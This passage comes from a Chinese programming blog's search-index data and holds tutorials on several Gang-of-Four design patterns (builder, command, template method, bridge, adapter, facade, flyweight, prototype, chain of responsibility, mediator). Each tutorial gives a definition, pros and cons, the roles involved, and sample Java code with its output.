Pattern）是一种设计模式，又名：建造模式，是一种对象构建模式。它可以将复杂对象的建造过程抽象出来（抽象类别），使这个抽象过程的不同实现方法可以构造出不同表现（属性）的对象。\n2. 优缺点 优点：\n封装性好，构建和表示分离。 扩展性好，各个具体的建造者相互独立，有利于系统的解耦。 屏蔽细节，客户端不必知道产品内部组成的细节，建造者可以对创建过程逐步细化，而不对其它模块产生任何影响，便于控制细节风险。 缺点：\n产品的组成部分必须相同，这限制了其使用范围。 如果产品的内部变化复杂，如果产品内部发生变化，则建造者也要同步修改，后期维护成本较大。 3. 结构 建造者（Builder）模式的主要角色如下：\n产品角色（Product）：它是包含多个组成部件的复杂对象，由具体建造者来创建其各个零部件。 抽象建造者（Builder）：它是一个包含创建产品各个子部件的抽象方法的接口，通常还包含一个返回复杂产品的方法 getResult()。 具体建造者(Concrete Builder）：实现 Builder 接口，完成复杂产品的各个部件的具体创建方法。 指挥者（Director）：它调用建造者对象中的部件构造与装配方法完成复杂对象的创建，在指挥者中不涉及具体产品的信息。 二、代码实现 产品角色 产品角色包含多个组成部件的复杂对象：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package pers.designPattern.builder; public class Product { private String partA; private String partB; private String partC; public void setPartA(String partA) { this.partA = partA; } public void setPartB(String partB) { this.partB = partB; } public void setPartC(String partC) { this.partC = partC; } public void show() { System.out.println(\u0026#34;Product{\u0026#34; + \u0026#34;partA=\u0026#39;\u0026#34; + partA + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, partB=\u0026#39;\u0026#34; + partB + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, partC=\u0026#39;\u0026#34; + partC + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;); } } 抽象建造者 抽象建造者包含创建产品各个子部件的抽象方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.builder; public abstract class Builder { protected Product product = new Product(); // 创建各个子部分 public abstract void buildPartA(); public abstract void buildPartB(); public abstract void buildPartC(); public Product getProduct() { // 返回产品对象 return product; } } 具体建造者 具体建造者实现了抽象建造者接口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package pers.designPattern.builder; public class ConcreteBuilder extends Builder { @Override public void buildPartA() { System.out.println(\u0026#34;建造 PartA...\u0026#34;); product.setPartA(\u0026#34;PartA\u0026#34;); } @Override public void buildPartB() { System.out.println(\u0026#34;建造 PartB...\u0026#34;); product.setPartB(\u0026#34;PartB\u0026#34;); } @Override public void buildPartC() { System.out.println(\u0026#34;建造 PartC...\u0026#34;); product.setPartC(\u0026#34;PartC\u0026#34;); } } 指挥者 指挥者会调用建造者中的方法完成复杂对象的创建：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package pers.designPattern.builder; public class Director { private Builder builder; public Director(Builder builder) { this.builder = builder; } public Product construct() { System.out.println(\u0026#34;开始制造产品...\u0026#34;); builder.buildPartA(); builder.buildPartB(); builder.buildPartC(); System.out.println(\u0026#34;产品制造完成！\u0026#34;); return builder.getProduct(); } } 客户类 1 2 3 4 5 6 7 8 9 10 package pers.designPattern.builder; public class BuilderClient { public static void main(String[] args) { Builder builder = new ConcreteBuilder(); Director director = new Director(builder); Product product = director.construct(); product.show(); } } 运行结果：\n开始制造产品... 建造 PartA... 建造 PartB... 建造 PartC... 产品制造完成！ Product{partA=\u0026#39;PartA\u0026#39;, partB=\u0026#39;PartB\u0026#39;, partC=\u0026#39;PartC\u0026#39;} 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"设计模式——建造者模式"},{"content":"设计模式——命令模式 一、基本概念 1. 定义 命令模式（英语：Command pattern）是一种设计模式，它尝试以对象来代表实际行动。命令对象可以把行动(action) 及其参数封装起来，于是这些行动可以被：重复多次、取消（如果该对象有实现的话）、取消后又再重做。\n2. 优缺点 优点：\n通过引入中间件（抽象接口）降低系统的耦合度； 扩展性良好，增加或删除命令非常方便。采用命令模式增加与删除命令不会影响其他类，且满足“开闭原则”； 可以实现宏命令。命令模式可以与组合模式结合，将多个命令装配成一个组合命令，即宏命令； 方便实现 Undo 和 Redo 操作。命令模式可以与后面介绍的备忘录模式结合，实现命令的撤销与恢复； 可以在现有命令的基础上，增加额外功能。比如日志记录，结合装饰器模式会更加灵活。 缺点：\n可能产生大量具体的命令类。因为每一个具体操作都需要设计一个具体命令类，这会增加系统的复杂性； 命令模式的结果其实就是接收方的执行结果，但是为了以命令的形式进行架构、解耦请求与实现，引入了额外类型结构（引入了请求方与抽象命令接口），增加了理解上的困难。不过这也是设计模式的通病，抽象必然会额外增加类的数量，代码抽离肯定比代码聚合更加难理解。 3. 结构 抽象命令类（Command）角色：声明执行命令的接口，拥有执行命令的抽象方法 execute()； 具体命令类（Concrete Command）角色：是抽象命令类的具体实现类，它拥有接收者对象，并通过调用接收者的功能来完成命令要执行的操作； 实现者/接收者（Receiver）角色：执行命令功能的相关操作，是具体命令对象业务的真正实现者； 调用者/请求者（Invoker）角色：是请求的发送者，它通常拥有很多的命令对象，并通过访问命令对象来执行相关请求，它不直接访问接收者。 二、代码实现 调用者 调用者是请求的发送者，它通常拥有很多的命令对象，并通过访问命令对象来执行相关请求，它不直接访问接收者：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package pers.designPattern.command; public class Invoker { private Command command; public Invoker(Command command) { this.command = command; } public void setCommand(Command command) { this.command = command; } public void call() { System.out.println(\u0026#34;调用者正在执行命令。。\u0026#34;); command.execute(); System.out.println(\u0026#34;命令执行完成！\u0026#34;); } } 抽象命令 声明执行命令的接口，拥有执行命令的抽象方法 execute()：\n1 2 3 4 5 package pers.designPattern.command; public interface Command { public abstract void execute(); } 具体命令 具体命令是抽象命令类的具体实现类，它拥有接收者对象，并通过调用接收者的功能来完成命令要执行的操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.command; public class ConcreteCommand implements Command { private Receiver receiver; ConcreteCommand() { receiver = new Receiver(); } @Override public void execute() { System.out.println(\u0026#34;命令发送给接收者!\u0026#34;); receiver.action(); } } 接收者 接收者执行命令功能的相关操作，是具体命令对象业务的真正实现者：\n1 2 3 4 5 6 7 package pers.designPattern.command; public class Receiver { public void action() { System.out.println(\u0026#34;接收者命令执行完成！\u0026#34;); } } 客户类 1 2 3 4 5 6 7 8 9 package pers.designPattern.command; public class CommandClient { public static void main(String[] args) { Command cmd = new ConcreteCommand(); Invoker invoker = new Invoker(cmd); invoker.call(); } } 运行结果：\n调用者正在执行命令。。 命令发送给接收者! 接收者命令执行完成！ 命令执行完成！ 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/","title":"设计模式——命令模式"},{"content":"设计模式——模板模式 一、基本概念 1. 定义 模板方法（Template Method）模式：定义一个操作中的算法骨架，而将算法的一些步骤延迟到子类中，使得子类可以不改变该算法结构的情况下重定义该算法的某些特定步骤。它是一种类行为型模式。\n模板方法模式是一种行为设计模式， 它在超类中定义了一个算法的框架， 允许子类在不修改结构的情况下重写算法的特定步骤。\n2. 优缺点 优点：\n它封装了不变部分，扩展可变部分。它把认为是不变部分的算法封装到父类中实现，而把可变部分算法由子类继承实现，便于子类继续扩展； 它在父类中提取了公共的部分代码，便于代码复用； 部分方法是由子类实现的，因此子类可以通过扩展方式增加相应的功能，符合开闭原则。 缺点：\n对每个不同的实现都需要定义一个子类，这会导致类的个数增加，系统更加庞大，设计也更加抽象，间接地增加了系统实现的复杂度； 父类中的抽象方法由子类实现，子类执行的结果会影响父类的结果，这导致一种反向的控制结构，它提高了代码阅读的难度； 由于继承关系自身的缺点，如果父类添加新的抽象方法，则所有子类都要改一遍。 3. 结构 抽象类/抽象模板（Abstract Class）：抽象模板类，负责给出一个算法的轮廓和骨架。它由一个模板方法和若干个基本方法构成： 模板方法：定义了算法的骨架，按某种顺序调用其包含的基本方法。 基本方法：是整个算法中的一个步骤，包含以下几种类型： 抽象方法：在抽象类中声明，由具体子类实现。 具体方法：在抽象类中已经实现，在具体子类中可以继承或重写它。 钩子方法：在抽象类中已经实现，包括用于判断的逻辑方法和需要子类重写的空方法两种。 具体子类/具体实现（Concrete Class）：具体实现类，实现抽象类中所定义的抽象方法和钩子方法，它们是一个顶级逻辑的一个组成步骤。 二、代码实现 抽象类 负责给出一个算法的轮廓和骨架。它由一个模板方法和若干个基本方法构成：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package pers.designPattern.templateMethod; public abstract class AbstractClass { public void TemplateMethod() { SpecificMethod(); abstractMethod1(); abstractMethod2(); } public void SpecificMethod() { System.out.println(\u0026#34;抽象类中的具体方法被调用...\u0026#34;); } public abstract void abstractMethod1(); public abstract void abstractMethod2(); } 具体实现类 实现抽象类中所定义的抽象方法和钩子方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package pers.designPattern.templateMethod; public class ConcreteClass extends AbstractClass { @Override public void abstractMethod1() { System.out.println(\u0026#34;抽象方法1被调用...\u0026#34;); } @Override public void abstractMethod2() { System.out.println(\u0026#34;抽象方法2被调用...\u0026#34;); } } 客户类 1 2 3 4 5 6 7 8 package pers.designPattern.templateMethod; public class TemplateMethodClient { public static void main(String[] args) { AbstractClass tm = new ConcreteClass(); tm.TemplateMethod(); } } 运行结果：\n抽象类中的具体方法被调用... 抽象方法1被调用... 抽象方法2被调用... 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F/","title":"设计模式——模板模式"},{"content":"设计模式——桥接模式 一、基本概念 1. 定义 **桥接模式（Bridge）**是软件设计模式中最复杂的模式之一，它把事物对象和其具体行为、具体特征分离开来，使它们可以各自独立的变化。\n2. 优缺点 优点：\n抽象与实现分离，扩展能力强； 符合开闭原则； 符合合成复用原则； 其实现细节对客户透明。 缺点：\n由于聚合关系建立在抽象层，要求开发者针对抽象化进行设计与编程，能正确地识别出系统中两个独立变化的维度，这增加了系统的理解与设计难度。 3. 结构 桥接（Bridge）模式包含以下主要角色：\n抽象化（Abstraction）角色：定义抽象类，并包含一个对实现化对象的引用。 扩展抽象化（Refined Abstraction）角色：是抽象化角色的子类，实现父类中的业务方法，并通过组合关系调用实现化角色中的业务方法。 实现化（Implementor）角色：定义实现化角色的接口，供扩展抽象化角色调用。 具体实现化（Concrete Implementor）角色：给出实现化角色接口的具体实现。 二、代码实现 UML 实现角色 颜色接口：\n1 2 3 4 5 package pers.designPattern.bridge; public interface Color { public void fillColor(String shape); } 具体实现化角色 红色：\n1 2 3 4 5 6 7 8 package pers.designPattern.bridge; public class Red implements Color { @Override public void fillColor(String shape) { System.out.println(\u0026#34;绘制红色的\u0026#34; + shape); } } 绿色：\n1 2 3 4 5 6 7 8 package pers.designPattern.bridge; public class Green implements Color { @Override public void fillColor(String shape) { System.out.println(\u0026#34;绘制绿色的\u0026#34; + shape); } } 抽象化角色 形状类，提供一个画形状的接口，并包含一个颜色的实例：\n1 2 3 4 5 6 7 8 9 10 11 package pers.designPattern.bridge; public abstract class Shape { Color color; public Shape(Color color) { this.color = color; } public abstract void drawShape(); } 拓展抽象化角色 圆形：\n1 2 3 4 5 6 7 8 9 10 11 12 package pers.designPattern.bridge; public class Circle extends Shape { public Circle(Color color) { super(color); } @Override public void drawShape() { color.fillColor(\u0026#34;圆形\u0026#34;); } } 正方形：\n1 2 3 4 5 6 7 8 9 10 11 12 package pers.designPattern.bridge; public class Square extends Shape { public Square(Color color) { super(color); } @Override public void drawShape() { color.fillColor(\u0026#34;正方形\u0026#34;); } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 package pers.designPattern.bridge; public class BridgeClient { public static void main(String[] args) { Color green = new Green(); Shape circle = new Circle(green); circle.drawShape(); Color red = new Red(); Shape square = new Square(red); square.drawShape(); } } 运行结果：\n绘制绿色的圆形 绘制红色的正方形 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/","title":"设计模式——桥接模式"},{"content":"设计模式——适配者模式 一、基本概念 1. 定义 适配器模式（英语：adapter pattern）有时候也称包装样式或者包装（英语：wrapper）。将一个类的接口转接成用户所期待的。一个适配使得因接口不兼容而不能在一起工作的类能在一起工作，做法是将类自己的接口包裹在一个已存在的类中。\n2. 优缺点 优点：\n客户端通过适配器可以透明地调用目标接口。 复用了现存的类，程序员不需要修改原有代码而重用现有的适配者类。 将目标类和适配者类解耦，解决了目标类和适配者类接口不一致的问题。 在很多业务场景中符合开闭原则。 缺点：\n适配器编写过程需要结合业务场景全面考虑，可能会增加系统的复杂性。 增加代码阅读难度，降低代码可读性，过多使用适配器会使系统代码变得凌乱。 3. 结构 适配器模式（Adapter）包含以下主要角色：\n目标（Target）接口：当前系统业务所期待的接口，它可以是抽象类或接口。 适配者（Adaptee）类：它是被访问和适配的现存组件库中的组件接口。 适配器（Adapter）类：它是一个转换器，通过继承或引用适配者的对象，把适配者接口转换成目标接口，让客户按目标接口的格式访问适配者。 二、代码实现 目标接口 1 2 3 4 5 package pers.designPattern.adapter; public interface Target { public void targetFunc(); } 适配者 1 2 3 4 5 6 7 package pers.designPattern.adapter; public class Adaptee { public void AdapteeFunc() { System.out.println(\u0026#34;适配者的方法正在运行！\u0026#34;); } } 适配器 1 2 3 4 5 6 7 8 package pers.designPattern.adapter; public class Adapter extends Adaptee implements Target { @Override public void targetFunc() { AdapteeFunc(); } } 客户 1 2 3 4 5 6 7 8 package pers.designPattern.adapter; public class AdapterClient { public static void main(String[] args) { Target target = new Adapter(); target.targetFunc(); } } 运行结果：\n适配者的方法正在运行！ 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%80%82%E9%85%8D%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"设计模式——适配者模式"},{"content":"设计模式——外观模式 一、基本概念 1. 定义 外观模式（Facade pattern），是软件工程中常用的一种软件设计模式，它为子系统中的一组界面提供一个统一的高层界面，使得子系统更容易使用。\n2. 优缺点 优点：\n降低了子系统与客户端之间的耦合度，使得子系统的变化不会影响调用它的客户类； 对客户屏蔽了子系统组件，减少了客户处理的对象数目，并使得子系统使用起来更加容易； 降低了大型软件系统中的编译依赖性，简化了系统在不同平台之间的移植过程，因为编译一个子系统不会影响其他的子系统，也不会影响外观对象。 缺点：\n不能很好地限制客户使用子系统类，很容易带来未知风险； 增加新的子系统可能需要修改外观类或客户端的源代码，违背了“开闭原则”。 3. 结构 外观（Facade）角色：为多个子系统对外提供一个共同的接口； 子系统（Sub System）角色：实现系统的部分功能，客户可以通过外观角色访问它； 客户（Client）角色：通过一个外观角色访问各个子系统的功能。 二、代码实现 外观角色 为多个子系统对外提供一个共同的接口：\n1 2 3 4 5 6 7 8 9 10 11 public class Facade { private SubSystem01 obj1 = new SubSystem01(); private SubSystem02 obj2 = new SubSystem02(); private SubSystem03 obj3 = new SubSystem03(); public void method() { obj1.method(); obj2.method(); obj3.method(); } } 子系统角色 实现系统的部分功能，客户可以通过外观角色访问它：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class SubSystem01 { public void method() { System.out.println(\u0026#34;方法一被调用！\u0026#34;); } } class SubSystem02 { public void method() { System.out.println(\u0026#34;方法二被调用！\u0026#34;); } } class SubSystem03 { public void method() { System.out.println(\u0026#34;方法三被调用！\u0026#34;); } } 客户类 1 2 3 4 5 6 7 8 package pers.designPattern.facade; public class FacadeClient { public static void main(String[] args) { Facade facade = new Facade(); facade.method(); } } 运行结果：\n方法一被调用！ 方法二被调用！ 方法三被调用！ 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/","title":"设计模式——外观模式"},{"content":"设计模式——享元模式 一、基本概念 1. 定义 享元模式（英语：Flyweight Pattern）是一种软件设计模式。它使用物件用来尽可能减少内存使用量；于相似物件中分享尽可能多的资讯。当大量物件近乎重复方式存在，因而使用大量内存时，此法适用。通常物件中的部分状态(state)能够共享。常见做法是把它们放在数据结构外部，当需要使用时再将它们传递给享元。\n2. 优缺点 优点：\n相同对象只要保存一份，这降低了系统中对象的数量，从而降低了系统中细粒度对象给内存带来的压力。 缺点：\n为了使对象可以共享，需要将一些不能共享的状态外部化，这将增加程序的复杂性； 读取享元模式的外部状态会使得运行时间稍微变长。 3. 结构 抽象享元（Flyweight）角色：是所有的具体享元类的基类，为具体享元规范需要实现的公共接口，非享元的外部状态以参数的形式通过方法传入； 具体享元（Concrete Flyweight）角色：实现抽象享元角色中所规定的接口； 非享元（Unsharable Flyweight）角色：是不可以共享的外部状态，它以参数的形式注入具体享元的相关方法中； 享元工厂（Flyweight Factory）角色：负责创建和管理享元角色。当客户对象请求一个享元对象时，享元工厂检査系统中是否存在符合要求的享元对象，如果存在则提供给客户；如果不存在的话，则创建一个新的享元对象。 二、代码实现 非享元角色 抽象享元角色是不可以共享的外部状态，它以参数的形式注入具体享元的相关方法中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package pers.designPattern.flyweight; public class UnsharedConcreteFlyweight { private String info; UnsharedConcreteFlyweight(String info) { this.info = info; } public String getInfo() { return info; } public void setInfo(String info) { this.info = info; } } 抽象享元角色 抽象享元角色是所有的具体享元类的基类，为具体享元规范需要实现的公共接口，非享元的外部状态以参数的形式通过方法传入：\n1 2 3 4 5 package pers.designPattern.flyweight; interface Flyweight { public void operation(UnsharedConcreteFlyweight state); } 具体享元角色 具体享元角色实现抽象享元角色中所规定的接口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class ConcreteFlyweight implements Flyweight { private String key; ConcreteFlyweight(String key) { this.key = key; System.out.println(\u0026#34;具体享元\u0026#34; + key + \u0026#34;被创建！\u0026#34;); } @Override public void operation(UnsharedConcreteFlyweight state) { System.out.print(\u0026#34;具体享元\u0026#34; + key + \u0026#34;被调用，\u0026#34;); System.out.println(\u0026#34;非享元信息是:\u0026#34; + state.getInfo()); } } 享元工厂角色 享元工厂角色负责创建和管理享元角色。当客户对象请求一个享元对象时，享元工厂检査系统中是否存在符合要求的享元对象，如果存在则提供给客户；如果不存在的话，则创建一个新的享元对象：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package pers.designPattern.flyweight; import java.util.HashMap; public class FlyweightFactory { private HashMap\u0026lt;String, Flyweight\u0026gt; flyweightHashMap = new HashMap\u0026lt;String, Flyweight\u0026gt;(); public Flyweight getFlyweight(String key) { Flyweight flyweight = (Flyweight) flyweightHashMap.get(key); if (flyweight != null) { System.out.println(\u0026#34;具体享元\u0026#34; + key + \u0026#34;已经存在，被成功获取！\u0026#34;); } else { flyweight = new ConcreteFlyweight(key); flyweightHashMap.put(key, flyweight); } return flyweight; } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.flyweight; public class FlyweightClient { public static void main(String[] args) { FlyweightFactory factory = new FlyweightFactory(); Flyweight f01 = factory.getFlyweight(\u0026#34;a\u0026#34;); Flyweight f02 = factory.getFlyweight(\u0026#34;a\u0026#34;); Flyweight f11 = factory.getFlyweight(\u0026#34;b\u0026#34;); Flyweight f12 = factory.getFlyweight(\u0026#34;b\u0026#34;); f01.operation(new UnsharedConcreteFlyweight(\u0026#34;第1次调用a。\u0026#34;)); f02.operation(new UnsharedConcreteFlyweight(\u0026#34;第2次调用a。\u0026#34;)); f11.operation(new UnsharedConcreteFlyweight(\u0026#34;第1次调用b。\u0026#34;)); f12.operation(new UnsharedConcreteFlyweight(\u0026#34;第2次调用b。\u0026#34;)); } } 运行结果：\n具体享元a被创建！ 具体享元a已经存在，被成功获取！ 具体享元b被创建！ 具体享元b已经存在，被成功获取！ 具体享元a被调用，非享元信息是:第1次调用a。 具体享元a被调用，非享元信息是:第2次调用a。 具体享元b被调用，非享元信息是:第1次调用b。 具体享元b被调用，非享元信息是:第2次调用b。 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/","title":"设计模式——享元模式"},{"content":"设计模式——原型模式 一、基本概念 1. 定义 原型模式是创建型模式的一种，其特点在于通过“复制”一个已经存在的实例来返回新的实例,而不是新建实例。被复制的实例就是我们所称的“原型”，这个原型是可定制的。\n原型模式多用于创建复杂的或者耗时的实例，因为这种情况下，复制一个已经存在的实例使程序运行更高效；或者创建值相等，只是命名不一样的同类数据。\n2. 优缺点 优点：\nJava 自带的原型模式基于内存二进制流的复制，在性能上比直接 new 一个对象更加优良； 可以使用深克隆方式保存对象的状态，使用原型模式将对象复制一份，并将其状态保存起来，简化了创建对象的过程，以便在需要的时候使用（例如恢复到历史某一状态），可辅助实现撤销操作。 缺点：\n需要为每一个类都配置一个 clone 方法； clone 方法位于类的内部，当对已有类进行改造的时候，需要修改代码，违背了开闭原则； 当实现深克隆时，需要编写较为复杂的代码，而且当对象之间存在多重嵌套引用时，为了实现深克隆，每一层对象对应的类都必须支持深克隆，实现起来会比较麻烦。因此，深克隆、浅克隆需要运用得当。 3. 结构 原型模式包含以下主要角色。\n抽象原型类：规定了具体原型对象必须实现的接口； 具体原型类：实现抽象原型类的 clone() 方法，它是可被复制的对象； 访问类：使用具体原型类中的 clone() 方法来复制新的对象。 4. UML Java 中的 Object 类提供了浅克隆的 clone() 方法，具体原型类只要实现 Cloneable 接口就可实现对象的浅克隆，这里的 Cloneable 接口就是抽象原型类。\n二、代码实现 原型模式的克隆分为浅克隆和深克隆。\n浅克隆：创建一个新对象，新对象的属性和原来对象完全相同，对于非基本类型属性，仍指向原有属性所指向的对象的内存地址； 深克隆：创建一个新对象，属性中引用的其他对象也会被克隆，不再指向原有对象地址。 浅克隆 浅克隆使用 Cloneable 实现即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package pers.designPattern.prototype; import java.util.ArrayList; class ConcretePrototype implements Cloneable { /* * 具体原型类 * */ public Object clone() throws CloneNotSupportedException { return super.clone(); } @Override public String toString() { return super.toString(); } } public class ShallowCloning { /* * 实现类 * */ public static void main(String[] args) throws CloneNotSupportedException { ConcretePrototype concretePrototype = new ConcretePrototype(); ArrayList\u0026lt;ConcretePrototype\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; 10; i++) { list.add((ConcretePrototype) concretePrototype.clone()); } list.forEach(System.out::println); } } 深克隆 深克隆一般情况下都是通过对象的序列化实现 (需要实现Serializable接口) 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package pers.designPattern.prototype; import java.io.*; class ConPrototype implements Serializable, Cloneable { /* * 需要实现 Serializable, Cloneable 两个接口 * */ private Target target = new Target(\u0026#34;小红\u0026#34;); public ConPrototype deepClone() { ByteArrayInputStream bis = null; ByteArrayOutputStream bos = null; ObjectOutputStream oos = null; ObjectInputStream ois = null; try { // 序列化 bos = new ByteArrayOutputStream(); oos = new ObjectOutputStream(bos); oos.writeObject(this); // 反序列化 bis = new ByteArrayInputStream(bos.toByteArray()); ois = new ObjectInputStream(bis); return (ConPrototype) ois.readObject(); } catch (IOException | ClassNotFoundException e) { e.printStackTrace(); return null; } finally { try { bos.close(); bis.close(); oos.close(); ois.close(); } catch (IOException e) { e.printStackTrace(); } } } public Target getTarget() { return target; } } class Target implements Serializable, Cloneable { // 需要被深拷贝的类也必须实现两个接口 public String name; public Target(String name) { this.name = name; } @Override protected Object clone() throws CloneNotSupportedException { return super.clone(); } } public class DeepCloning { public static void main(String[] args) { ConPrototype obj = new ConPrototype(); ConPrototype obj1 = (ConPrototype) obj.deepClone(); // 比较 System.out.println(obj.getTarget().equals(obj1.getTarget())); } } 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"设计模式——原型模式"},{"content":"设计模式——责任链模式 一、基本概念 1. 定义 **责任链模式（Chain of Responsibility）：**在面向对象程式设计里是一种软件设计模式，它包含了一些命令对象和一系列的处理对象。每一个处理对象决定它能处理哪些命令对象，它也知道如何将它不能处理的命令对象传递给该链中的下一个处理对象。该模式还描述了往该处理链的末尾添加新的处理对象的方法。\n2. 优缺点 优点：\n降低了对象之间的耦合度。该模式使得一个对象无须知道到底是哪一个对象处理其请求以及链的结构，发送者和接收者也无须拥有对方的明确信息； 增强了系统的可扩展性。可以根据需要增加新的请求处理类，满足开闭原则； 增强了给对象指派职责的灵活性。当工作流程发生变化，可以动态地改变链内的成员或者调动它们的次序，也可动态地新增或者删除责任； 责任链简化了对象之间的连接。每个对象只需保持一个指向其后继者的引用，不需保持其他所有处理者的引用，这避免了使用众多的 if 或者 if···else 语句； 责任分担。每个类只需要处理自己该处理的工作，不该处理的传递给下一个对象完成，明确各类的责任范围，符合类的单一职责原则。 缺点：\n不能保证每个请求一定被处理。由于一个请求没有明确的接收者，所以不能保证它一定会被处理，该请求可能一直传到链的末端都得不到处理； 对比较长的职责链，请求的处理可能涉及多个处理对象，系统性能将受到一定影响； 职责链建立的合理性要靠客户端来保证，增加了客户端的复杂性，可能会由于职责链的错误设置而导致系统出错，如可能会造成循环调用。 3. 结构 抽象处理者（Handler）角色：定义一个处理请求的接口，包含抽象处理方法和一个后继连接； 具体处理者（Concrete Handler）角色：实现抽象处理者的处理方法，判断能否处理本次请求，如果可以处理请求则处理，否则将该请求转给它的后继者； 客户类（Client）角色：创建处理链，并向链头的具体处理者对象提交请求，它不关心处理细节和请求的传递过程。 二、代码实现 抽象处理者角色 定义一个处理请求的接口，包含抽象处理方法和一个后继连接：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.chainOfResponsibility; public abstract class Handler { private Handler next; public void setNext(Handler next) { this.next = next; } public Handler getNext() { return next; } public abstract void handlerRequest(String request); } 具体处理者角色 实现抽象处理者的处理方法，判断能否处理本次请求，如果可以处理请求则处理，否则将该请求转给它的后继者：\n处理者1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package pers.designPattern.chainOfResponsibility; public class ConcreteHandler1 extends Handler { @Override public void handlerRequest(String request) { request = request + \u0026#34; - 处理者1 已处理\u0026#34;; System.out.println(\u0026#34;处理者1 已经处理该请求!\u0026#34;); if (getNext() != null) { getNext().handlerRequest(request); } else { System.out.println(\u0026#34;无人处理该请求!\u0026#34;); } } } 处理者2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.chainOfResponsibility; public class ConcreteHandler2 extends Handler { @Override public void handlerRequest(String request) { request = request + \u0026#34;- 处理者2 已处理 \u0026#34;; System.out.println(\u0026#34;处理者2 已经处理该请求!\u0026#34;); if (getNext() != null) { getNext().handlerRequest(request); } else { System.out.println(\u0026#34;请求处理完毕!\u0026#34;); System.out.println(\u0026#34;最终处理结果：\u0026#34; + request); } } } 客户类 1 2 3 4 5 6 7 8 9 10 11 package pers.designPattern.chainOfResponsibility; public class ChainOfResponsibilityClient { public static void main(String[] args) { Handler handler1 = new ConcreteHandler1(); Handler handler2 = new ConcreteHandler2(); handler1.setNext(handler2); handler1.handlerRequest(\u0026#34;Hello World!\u0026#34;); } } 运行结果：\n处理者1 已经处理该请求! 处理者2 已经处理该请求! 请求处理完毕! 最终处理结果：Hello World! - 处理者1 已处理- 处理者2 已处理 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/","title":"设计模式——责任链模式"},{"content":"设计模式——中介者模式 一、基本概念 1. 定义 中介者（Mediator）模式：定义一个中介对象来封装一系列对象之间的交互，使原有对象之间的耦合松散，且可以独立地改变它们之间的交互。中介者模式又叫调停模式，它是迪米特法则的典型应用。\n2. 优缺点 优点：\n类之间各司其职，符合迪米特法则； 降低了对象之间的耦合性，使得对象易于独立地被复用； 